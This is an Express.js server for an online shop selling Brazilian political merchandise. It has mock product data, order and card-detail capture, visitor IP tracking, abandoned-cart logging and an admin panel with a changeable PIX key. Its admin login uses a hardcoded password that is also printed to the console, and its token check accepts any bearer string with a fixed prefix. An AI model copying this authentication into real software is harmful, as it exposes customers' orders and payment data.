const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// ========== BANCO DE DADOS MOCKADO ==========
let produtos = [
    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONE+PRETO", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 4, nome: "Moletom Canguru 2026", preco: 179.90, preco_antigo: 249.90, imagem: "https://placehold.co/600x800/e9e0d3/8b6b3d?text=MOLETOM", categoria: "Moletons", estoque: 20, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 5, nome: "Regata Dry Fit Brasil", preco: 69.90, preco_antigo: 99.90, imagem: "https://placehold.co/600x800/f2ede2/8b6b3d?text=REGATA", categoria: "Camisetas", estoque: 40, destaque: true, ativo: true, created_at: new Date().toISOString() },
    { id: 6, nome: "Camiseta Deus Acima de Todos", preco: 79.90, preco_antigo: 109.90, imagem: "https://placehold.co/600x800/fcf7ef/8b6b3d?text=CAMISETA+BRANCA", categoria: "Camisetas", estoque: 60, destaque: true, ativo: true, created_at: new Date().toISOString() }
];

let pedidos = [];
let cartoes = [];
let visitantes = [];
let carrinhosAbandonados = [];
let pixKey = '';

// ========== ROTAS PÚBLICAS ==========

// Listar produtos (com suporte a filtros)
app.get('/api/produtos', (req, res) => {
    const { categoria, destaque } = req.query;
    let filtered = produtos.filter(p => p.ativo === true);
    
    if (categoria) {
        filtered = filtered.filter(p => p.categoria === categoria);
    }
    if (destaque === 'true') {
        filtered = filtered.filter(p => p.destaque === true);
    }
    
    res.json({ success: true, produtos: filtered });
});

// Buscar um produto específico
app.get('/api/produtos/:id', (req, res) => {
    const produto = produtos.find(p => p.id === parseInt(req.params.id));
    if (produto) {
        res.json({ success: true, produto });
    } else {
        res.status(404).json({ success: false, error: 'Produto não encontrado' });
    }
});

// Buscar CEP
app.get('/api/cep/:cep', async (req, res) => {
    const cep = req.params.cep.replace(/\D/g, '');
    if (cep.length !== 8) return res.json({ error: 'CEP inválido' });
    try {
        const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const data = await response.json();
        if (data.erro) return res.json({ error: 'CEP não encontrado' });
        res.json({ success: true, logradouro: data.logradouro, bairro: data.bairro, cidade: data.localidade, uf: data.uf });
    } catch (error) {
        res.json({ error: 'Erro ao buscar CEP' });
    }
});

// Salvar pedido
app.post('/api/pedido', (req, res) => {
    const pedidoId = 'CAP' + Date.now();
    const pedido = { ...req.body, pedido_id: pedidoId, created_at: new Date().toISOString() };
    pedidos.unshift(pedido);
    res.json({ success: true, pedido_id: pedidoId });
});

// Registrar visitante
app.post('/api/visitante', (req, res) => {
    const { visitor_id, ip, user_agent, origem } = req.body;
    const existing = visitantes.find(v => v.visitor_id === visitor_id);
    if (existing) {
        existing.ultima_atividade = new Date().toISOString();
        existing.page_views = (existing.page_views || 0) + 1;
    } else {
        visitantes.push({
            visitor_id,
            ip,
            user_agent,
            origem: origem || 'direct',
            etapa: 'visitante',
            page_views: 1,
            primeira_visita: new Date().toISOString(),
            ultima_atividade: new Date().toISOString()
        });
    }
    res.json({ success: true });
});

// Carrinho abandonado
app.post('/api/carrinho', (req, res) => {
    const { visitor_id, itens, total } = req.body;
    const existing = carrinhosAbandonados.find(c => c.visitor_id === visitor_id);
    if (existing) {
        existing.itens = itens;
        existing.total = total;
        existing.total_itens = itens.length;
        existing.updated_at = new Date().toISOString();
    } else {
        carrinhosAbandonados.push({
            visitor_id,
            itens,
            total,
            total_itens: itens.length,
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString()
        });
    }
    res.json({ success: true });
});

// Salvar cartão (criptografado simulado)
app.post('/api/cartao', (req, res) => {
    const { nome_titular, ultimos_4, bandeira, validade_mes, validade_ano } = req.body;
    const novoCartao = {
        id: Date.now(),
        nome_titular,
        ultimos_4,
        bandeira,
        validade_mes,
        validade_ano,
        created_at: new Date().toISOString()
    };
    cartoes.push(novoCartao);
    res.json({ success: true });
});

// ========== LOGIN ADMIN ==========
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'capitao2025') {
        res.json({ success: true, token: 'admin_auth_' + Date.now() });
    } else {
        res.status(401).json({ success: false });
    }
});

// Middleware de autenticação
function verifyAdmin(req, res, next) {
    const token = req.headers.authorization;
    if (!token || !token.startsWith('Bearer admin_auth_')) {
        return res.status(401).json({ success: false });
    }
    next();
}

// ========== ADMIN: CRUD PRODUTOS ==========

// Listar todos os produtos (admin)
app.get('/api/admin/produtos', verifyAdmin, (req, res) => {
    res.json({ success: true, produtos });
});

// Adicionar produto
app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
    const { nome, preco, preco_antigo, imagem, categoria, estoque, destaque } = req.body;
    const novoId = Math.max(...produtos.map(p => p.id), 0) + 1;
    const novoProduto = {
        id: novoId,
        nome,
        preco: parseFloat(preco),
        preco_antigo: preco_antigo ? parseFloat(preco_antigo) : null,
        imagem: imagem || 'https://placehold.co/600x800',
        categoria: categoria || 'Geral',
        estoque: parseInt(estoque) || 0,
        destaque: destaque === true || destaque === 'true',
        ativo: true,
        created_at: new Date().toISOString()
    };
    produtos.push(novoProduto);
    res.json({ success: true, produto: novoProduto });
});

// Atualizar produto
app.put('/api/admin/produtos/:id', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index === -1) {
        return res.status(404).json({ success: false, error: 'Produto não encontrado' });
    }
    produtos[index] = { ...produtos[index], ...req.body, id: produtos[index].id };
    res.json({ success: true, produto: produtos[index] });
});

// Deletar produto (soft delete)
app.delete('/api/admin/produtos/:id', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index === -1) {
        return res.status(404).json({ success: false, error: 'Produto não encontrado' });
    }
    produtos[index].ativo = false;
    res.json({ success: true });
});

// Deletar produto permanentemente
app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index === -1) {
        return res.status(404).json({ success: false, error: 'Produto não encontrado' });
    }
    produtos.splice(index, 1);
    res.json({ success: true });
});

// ========== ADMIN: OUTRAS ROTAS ==========

// Listar pedidos
app.get('/api/admin/pedidos', verifyAdmin, (req, res) => {
    res.json({ success: true, pedidos });
});

// Listar cartões
app.get('/api/admin/cartoes', verifyAdmin, (req, res) => {
    res.json({ success: true, cartoes });
});

// Listar visitantes
app.get('/api/admin/visitantes', verifyAdmin, (req, res) => {
    res.json({ success: true, visitantes });
});

// Listar carrinhos abandonados
app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => {
    res.json({ success: true, carrinhos: carrinhosAbandonados });
});

// Estatísticas
app.get('/api/admin/stats', verifyAdmin, (req, res) => {
    const online = visitantes.filter(v => new Date(v.ultima_atividade) > new Date(Date.now() - 5 * 60 * 1000)).length;
    const revenue = pedidos.reduce((sum, p) => sum + (parseFloat(p.total) || 0), 0);
    res.json({
        success: true,
        stats: {
            online,
            abandoned_carts: carrinhosAbandonados.length,
            total_cards: cartoes.length,
            revenue,
            total_products: produtos.filter(p => p.ativo).length,
            total_orders: pedidos.length,
            total_visitors: visitantes.length
        }
    });
});

// Configuração PIX
app.get('/api/admin/pix', verifyAdmin, (req, res) => {
    res.json({ success: true, pix_key: pixKey });
});

app.post('/api/admin/pix', verifyAdmin, (req, res) => {
    pixKey = req.body.pix_key;
    res.json({ success: true });
});

// ========== INICIAR SERVIDOR ==========
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Admin: http://localhost:${PORT}/admin`);
    console.log(`Login: admin / capitao2025`);
});